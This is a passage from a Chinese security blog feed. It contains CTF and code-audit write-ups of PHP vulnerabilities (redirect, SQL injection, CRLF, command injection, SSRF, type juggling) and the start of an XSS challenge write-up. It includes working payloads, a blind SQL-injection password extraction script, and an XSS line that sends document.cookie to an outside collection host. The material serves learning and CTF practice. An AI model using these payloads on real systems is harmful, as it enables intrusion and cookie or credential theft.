alt="image_1d44dno9m1j0p1961kjq52411p033.png-272.8kB"></p><p>嫖的原理图：<br><img src="http://static.zybuluo.com/Passer6y/y07v0jyh18e8k8bfwwdyewe9/image_1d455o1ju1feu1hmv18gd1b5qg416d.png" alt="image_1d455o1ju1feu1hmv18gd1b5qg416d.png-136.1kB"></p><h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><p> <code>$_SERVER[&#39;PHP_SELF&#39;]</code>配合一些特殊的url解析模式(如PATH_INFO)导致的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Redirect &#123;</span><br><span class="line">  private $websiteHost = &apos;www.example.com&apos;;</span><br><span class="line"></span><br><span class="line">  private function setHeaders($url) &#123;</span><br><span class="line">    $url = urldecode($url);</span><br><span class="line">    header(&quot;Location: $url&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function startRedirect($params) &#123;</span><br><span class="line">    $parts = explode(&apos;/&apos;, $_SERVER[&apos;PHP_SELF&apos;]);</span><br><span class="line">    $baseFile = end($parts);</span><br><span class="line">    $url = sprintf(</span><br><span class="line">      &quot;%s?%s&quot;,</span><br><span class="line">      $baseFile,</span><br><span class="line">      http_build_query($params)</span><br><span class="line">    );</span><br><span class="line">    $this-&gt;setHeaders($url);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_GET[&apos;redirect&apos;]) &#123;</span><br><span class="line">  (new Redirect())-&gt;startRedirect($_GET[&apos;params&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果URL是<code>PATH_INFO</code>的时候，比如<code>http://demo.com/index.php/admin</code>实际上还是访问的<code>index.php</code>这样的入口文件。<br>比如：<code>http://demo.com/index.php/http://baidu.com</code>，<code>$_SERVER[&#39;PHP_SELF&#39;]</code>获取到的是<code>/index.php/http://baidu.com</code>，而这里会<code>explode</code>处理<code>/</code>，取数组的最后一个作为  <code>$baseFile</code>，由于代码中设置<code>header()</code>前有一次url解码，这就导致了我们可以二次url编码绕过这个<code>/</code>限制，payload：<br><code>http://demo.com/index.php/http:%252f%252fbaidu.com?redirect=1&amp;params[a]=1</code></p><p>这样就产生了一个url跳转漏洞。</p><p>红日安全提供的ctf题：<a href="https://xz.aliyun.com/t/3178" target="_blank" rel="noopener">https://xz.aliyun.com/t/3178</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &quot;./config.php&quot;;</span><br><span class="line">include &quot;./flag.php&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&apos;|&quot;;</span><br><span class="line">$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;</span><br><span class="line">if(preg_match($black_list, $_GET[&apos;user&apos;])) exit(&quot;:P&quot;); </span><br><span class="line">if(preg_match($black_list, $_GET[&apos;pwd&apos;])) exit(&quot;:P&quot;); </span><br><span class="line"></span><br><span class="line">$query=&quot;select user from users where user=&apos;$_GET[user]&apos; and pwd=&apos;$_GET[pwd]&apos;&quot;;</span><br><span class="line">echo &quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;;</span><br><span class="line">$result = $conn-&gt;query($query);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    if($row[&apos;user&apos;]) echo &quot;&lt;h2&gt;Welcome &#123;$row[&apos;user&apos;]&#125;&lt;/h2&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query(&quot;select pwd from users where user=&apos;admin&apos;&quot;);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $admin_pass = $row[&apos;pwd&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(($admin_pass)&amp;&amp;($admin_pass === $_GET[&apos;pwd&apos;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>很明显是sql注入的绕过，仔细分析过滤规则可以发现没有过滤<code>\</code>，因为是双条件查询这样就可以闭合引号了。这里需要注出admin的密码就能拿flag。</p><p>payload：<code>?user=\&amp;pwd=||/**/pwd/**/REGEXP/**/&quot;^8&quot;;%00</code><br><img src="http://static.zybuluo.com/Passer6y/s1zqhql4b0bvvuoaokcf93do/image_1d459mnjach7t521feldgaa466q.png" alt="image_1d459mnjach7t521feldgaa466q.png-99.3kB"></p><p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">char_set = &apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;</span><br><span class="line">pw = &apos;&apos;</span><br><span class="line">while 1:</span><br><span class="line">    for ch in char_set:</span><br><span class="line">        url = &apos;http://localhost/CTF/?user=\\&amp;pwd=||pwd/**/regexp/**/&quot;^%s&quot;;%%00&apos;</span><br><span class="line">        r = requests.get(url=url%(pw+ch))</span><br><span class="line">        if &apos;Welcome Admin&apos; in r.text:</span><br><span class="line">            pw += ch</span><br><span class="line">            print(pw)</span><br><span class="line">            break</span><br><span class="line">    if ch == &apos;_&apos;: break</span><br><span class="line">r = requests.get(&apos;http://localhost/CTF/?user=&amp;pwd=%s&apos; % pw)</span><br><span class="line">print(re.findall(&apos;HRCTF&#123;\S&#123;1,50&#125;&#125;&apos;,r.text)[0])</span><br></pre></td></tr></table></figure></p><blockquote><p>这种注入方式局限在于只能指定同一表中的其他字段。</p></blockquote><h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class FTP &#123;</span><br><span class="line">  public $sock;</span><br><span class="line"></span><br><span class="line">  public function __construct($host, $port, $user, $pass) &#123;</span><br><span class="line">    $this-&gt;sock = fsockopen($host, $port);</span><br><span class="line"></span><br><span class="line">    $this-&gt;login($user, $pass);</span><br><span class="line">    $this-&gt;cleanInput();</span><br><span class="line">    $this-&gt;mode($_REQUEST[&apos;mode&apos;]);</span><br><span class="line">    $this-&gt;send($_FILES[&apos;file&apos;]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private function cleanInput() &#123;</span><br><span class="line">    $_GET = array_map(&apos;intval&apos;, $_GET);</span><br><span class="line">    $_POST = array_map(&apos;intval&apos;, $_POST);</span><br><span class="line">    $_COOKIE = array_map(&apos;intval&apos;, $_COOKIE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function login($username, $password) &#123;</span><br><span class="line">    fwrite($this-&gt;sock, &quot;USER &quot; . $username . &quot;\n&quot;);</span><br><span class="line">    fwrite($this-&gt;sock, &quot;PASS &quot; . $password . &quot;\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function mode($mode) &#123;</span><br><span class="line">    if ($mode == 1 || $mode == 2 || $mode == 3) &#123;</span><br><span class="line">      fputs($this-&gt;sock, &quot;MODE $mode\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function send($data) &#123;</span><br><span class="line">    fputs($this-&gt;sock, $data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new FTP(&apos;localhost&apos;, 21, &apos;user&apos;, &apos;password&apos;);</span><br></pre></td></tr></table></figure><p><code>$_REQUEST[&#39;mode&#39;]</code>获取数据未经过滤+弱类型比较<br>payload:<code>?mode=1%0a%0dDELETE%20test.file</code></p><h2 id="Day-17-Mistletoe"><a href="#Day-17-Mistletoe" class="headerlink" title="Day 17 - Mistletoe"></a>Day 17 - Mistletoe</h2><p><code>md5($this-&gt;password, true)</code>绕过<code>addslashes</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class RealSecureLoginManager &#123;</span><br><span class="line">  private $em;</span><br><span class="line">  private $user;</span><br><span class="line">  private $password;</span><br><span class="line"></span><br><span class="line">  public function __construct($user, $password) &#123;</span><br><span class="line">    $this-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">    $this-&gt;user = $user;</span><br><span class="line">    $this-&gt;password = $password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function isValid() &#123;</span><br><span class="line">    $pass = md5($this-&gt;password, true);</span><br><span class="line">    $user = $this-&gt;sanitizeInput($this-&gt;user);</span><br><span class="line"></span><br><span class="line">    $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">      -&gt;select(&quot;COUNT(p)&quot;)</span><br><span class="line">      -&gt;from(&quot;User&quot;, &quot;u&quot;)</span><br><span class="line">      -&gt;where(&quot;password = &apos;$pass&apos; AND user = &apos;$user&apos;&quot;);</span><br><span class="line">    $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">    return boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function sanitizeInput($input) &#123;</span><br><span class="line">    return addslashes($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = new RealSecureLoginManager(</span><br><span class="line">  $_POST[&apos;user&apos;],</span><br><span class="line">  $_POST[&apos;passwd&apos;]</span><br><span class="line">);</span><br><span class="line">if (!$auth-&gt;isValid()) &#123;</span><br><span class="line">  exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所有的输入数据都被<code>addslashes</code>过滤了一遍，这里看似没有办法闭合sql语句的引号，其实这里问题出在<code>md5()</code>函数上：<a href="http://php.net/manual/zh/function.md5.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.md5.php</a><br><img src="http://static.zybuluo.com/Passer6y/hiuqk58p71ptom9z3knf80l8/image_1d45k6pqggcka5s1umi10ut18j49.png" alt="image_1d45k6pqggcka5s1umi10ut18j49.png-62.2kB"></p><p>如果第二个参数设置为<code>true</code>，则以原始的二进制数据返回。</p><p><img src="http://static.zybuluo.com/Passer6y/g43ju1hmzvd80bphurzppcfp/image_1d45k9u9ld5m1aopq9tmtmi98m.png" alt="image_1d45k9u9ld5m1aopq9tmtmi98m.png-65.1kB"></p><p>那么有没有可能让<code>md5($string, true)</code>,最后一位出现<code>\</code>呢。<br><img src="http://static.zybuluo.com/Passer6y/jxilluy8e6czpieybqt1othv/image_1d45kequ7h9cd7h1vo31ei78o13.png" alt="image_1d45kequ7h9cd7h1vo31ei78o13.png-10.8kB"></p><p>跑出来<code>md5(&quot;128&quot;,true);</code>的最后一位为<code>\</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for($i=1; $i&lt;9999; $i++)&#123;</span><br><span class="line">    $string = md5($i,true);</span><br><span class="line">    if(substr($string,-1) == &quot;\\&quot;)&#123;</span><br><span class="line">        echo $i.&quot;\n&quot;.$string;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后的注入流程就和前面所述一致了。</p><p>还有一些比较有意思的点<br>比如：<br><code>md5(&quot;ffifdyop&quot;,true); //  &#39;or&#39;6�]��!r,��b</code><br><code>md5(&quot;129581926211651571912466741651878684928&quot;,true); // �T0D��o#��&#39;or&#39;8</code></p><p>可以用来绕过这样的场景：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先：SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;md5($password,true)&apos;</span><br><span class="line">变成：SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&apos;or&apos;6\xc9]\x99&apos;</span><br></pre></td></tr></table></figure></p><p><code>and</code>优先级比<code>or</code>高，导致整个where子句为真，即必然会出数据。</p><p>红日安全分享了一道这个考点的题：<a href="https://xz.aliyun.com/t/3375" target="_blank" rel="noopener">https://xz.aliyun.com/t/3375</a></p><h2 id="Day-18-Sign"><a href="#Day-18-Sign" class="headerlink" title="Day 18 - Sign"></a>Day 18 - Sign</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class JWT &#123;</span><br><span class="line">  public function verifyToken($data, $signature) &#123;</span><br><span class="line">    $pub = openssl_pkey_get_public(&quot;file://pub_key.pem&quot;);</span><br><span class="line">    $signature = base64_decode($signature);</span><br><span class="line">    if (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">      $object = json_decode(base64_decode($data));</span><br><span class="line">      $this-&gt;loginAsUser($object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new JWT())-&gt;verifyToken($_GET[&apos;d&apos;], $_GET[&apos;s&apos;]);</span><br></pre></td></tr></table></figure><h2 id="Day-19-Birch"><a href="#Day-19-Birch" class="headerlink" title="Day 19 - Birch"></a>Day 19 - Birch</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class ImageViewer &#123;</span><br><span class="line">  private $file;</span><br><span class="line"></span><br><span class="line">  function __construct($file) &#123;</span><br><span class="line">    $this-&gt;file = &quot;images/$file&quot;;</span><br><span class="line">    $this-&gt;createThumbnail();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function createThumbnail() &#123;</span><br><span class="line">    $e = stripcslashes(</span><br><span class="line">      preg_replace(</span><br><span class="line">        &apos;/[^0-9\\\]/&apos;,</span><br><span class="line">        &apos;&apos;,</span><br><span class="line">        isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos;</span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">    system(&quot;/usr/bin/convert $this-&gt;file --resize $e</span><br><span class="line">      ./thumbs/$this-&gt;file&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function __toString() &#123;</span><br><span class="line">    return &quot;&lt;a href=$this-&gt;file&gt;</span><br><span class="line">      &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo (new ImageViewer(&quot;image.png&quot;));</span><br></pre></td></tr></table></figure><p>只允许数字，且会将转义符去除，这里可以使用8进制绕过限制：<br><code>0\073\163\154\145\145\160\0405\073</code><br><img src="http://static.zybuluo.com/Passer6y/bh42en0phvil1n85lqbwtdfd/image_1d45nt3cr1m1l1rrg109stu1c5v1g.png" alt="image_1d45nt3cr1m1l1rrg109stu1c5v1g.png-112.5kB"></p><h2 id="Day-20-Stocking"><a href="#Day-20-Stocking" class="headerlink" title="Day 20 - Stocking"></a>Day 20 - Stocking</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">set_error_handler(function ($no, $str, $file, $line) &#123;</span><br><span class="line">    throw new ErrorException($str, 0, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line">class ImageLoader</span><br><span class="line">&#123;</span><br><span class="line">    public function getResult($uri)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return &apos;&lt;p&gt;Please enter valid uri&lt;/p&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            $image = file_get_contents($uri);</span><br><span class="line">            $path = &quot;./images/&quot; . uniqid() . &apos;.jpg&apos;;</span><br><span class="line">            file_put_contents($path, $image);</span><br><span class="line">            if (mime_content_type($path) !== &apos;image/jpeg&apos;) &#123;</span><br><span class="line">                unlink($path);</span><br><span class="line">                return &apos;&lt;p&gt;Only .jpg files allowed&lt;/p&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception $e) &#123;</span><br><span class="line">            return &apos;&lt;p&gt;There was an error: &apos; .</span><br><span class="line">                $e-&gt;getMessage() . &apos;&lt;/p&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &apos;&lt;img src=&quot;&apos; . $path . &apos;&quot; width=&quot;100&quot;/&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo (new ImageLoader())-&gt;getResult($_GET[&apos;img&apos;]);</span><br></pre></td></tr></table></figure><p>ssrf无过滤，只能盲打，或者通过报错来看：<br><img src="http://static.zybuluo.com/Passer6y/02d6nl1jns683da94f0xy6xs/image_1d45q71vf15t61rt61jbq1q2p1apj2d.png" alt="image_1d45q71vf15t61rt61jbq1q2p1apj2d.png-70.7kB"></p><h2 id="Day-21-Gift-Wrap"><a href="#Day-21-Gift-Wrap" class="headerlink" title="Day 21 - Gift Wrap"></a>Day 21 - Gift Wrap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">declare(strict_types=1);</span><br><span class="line"></span><br><span class="line">class ParamExtractor &#123;</span><br><span class="line">  private $validIndices = [];</span><br><span class="line"></span><br><span class="line">  private function indices($input) &#123;</span><br><span class="line">    $validate = function (int $value, $key) &#123;</span><br><span class="line">      if ($value &gt; 0) &#123;</span><br><span class="line">        $this-&gt;validIndices[] = $key;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      array_walk($input, $validate, 0);</span><br><span class="line">    &#125; catch (TypeError $error) &#123;</span><br><span class="line">      echo &quot;Only numbers are allowed as input&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $this-&gt;validIndices;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getCommand($parameters) &#123;</span><br><span class="line">    $indices = $this-&gt;indices($parameters);</span><br><span class="line">    $params = [];</span><br><span class="line">    foreach ($indices as $index) &#123;</span><br><span class="line">      $params[] = $parameters[$index];</span><br><span class="line">    &#125;</span><br><span class="line">    return implode($params, &apos; &apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (new ParamExtractor())-&gt;getCommand($_GET[&apos;p&apos;]);</span><br><span class="line">system(&apos;resizeImg image.png &apos; . $cmd);</span><br></pre></td></tr></table></figure><p>命令执行，绕过类型转换，本地没复现成功..</p><h2 id="Day-22-Chimney"><a href="#Day-22-Chimney" class="headerlink" title="Day 22 - Chimney"></a>Day 22 - Chimney</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">  setcookie(&apos;hash&apos;, md5($_POST[&apos;password&apos;]));</span><br><span class="line">  header(&quot;Refresh: 0&quot;);</span><br><span class="line">  exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = &apos;0e836584205638841937695747769655&apos;;</span><br><span class="line">if (!isset($_COOKIE[&apos;hash&apos;])) &#123;</span><br><span class="line">  echo &apos;&lt;form&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&apos;</span><br><span class="line">  . &apos;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt;&lt;/form &gt;&apos;;</span><br><span class="line">  exit;</span><br><span class="line">&#125; elseif (md5($_COOKIE[&apos;hash&apos;]) == $password) &#123;</span><br><span class="line">  echo &apos;Login succeeded&apos;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &apos;Login failed&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，简单的<code>md5</code>若类型比较漏洞:</p><p><img src="http://static.zybuluo.com/Passer6y/d00zdb3awktvhc8ag06nt3ni/image_1d471t5dq1fer1vo49j1ien13ng37.png" alt="image_1d471t5dq1fer1vo49j1ien13ng37.png-240.9kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/03/17/5c8d1fb7af458.png&quot; alt=&quot;更新图片&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>The power of XSS WriteUp</title>
    <link href="http://0day.design/2019/02/10/The%20power%20of%20XSS%20WriteUp/"/>
    <id>http://0day.design/2019/02/10/The power of XSS WriteUp/</id>
    <published>2019-02-10T09:31:00.000Z</published>
    <updated>2019-02-10T09:35:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>学习了一下xss-&gt;ssrf-&gt;redis<br><a id="more"></a></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>不知道为啥，xss平台一直打不到手动就可以..<br>payload:<code>&lt;svg/onload=&quot;document.location=&#39;http://dyfuca.ceye.io/?&#39;+document.cookie&quot;&gt;</code><br><img src="http://static.zybuluo.com/Passer6y/trvu9ejsrfoxtx8ha9s9s3u0/image_1d3at5i7r1e4n4fmt7b10vb494m.png" alt="image_1d3at5i7r1e4n4fmt7b10vb494m.png-75.8kB"><br><img src="http://static.zybuluo.com/Passer6y/9gowzenemkmsthnbpc916eks/image_1d3at6ki31l221i03h0tqbt153i13.png" alt="image_1d3at6ki31l221i03h0tqbt153i13.png-27.1kB"></p><p>flag:<code>FLAG{Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;}</code></p><p>给了我们一个管理员的session，提示我们flag2要打内网的redis。</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>修改成admin的session后：<br><img src="http://static.zybuluo.com/Passer6y/of9u5jd32kuzvm5k6sicp59z/image_1d3atoqmvhkc13p5b7nbtnso1g.png" alt="image_1d3atoqmvhkc13p5b7nbtnso1g.png-38.5kB"></p><p>打源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://dyfuca.ceye.io/?&apos;+btoa(document.body.innerHTML&quot;)  // 过滤了()</span><br><span class="line"></span><br><span 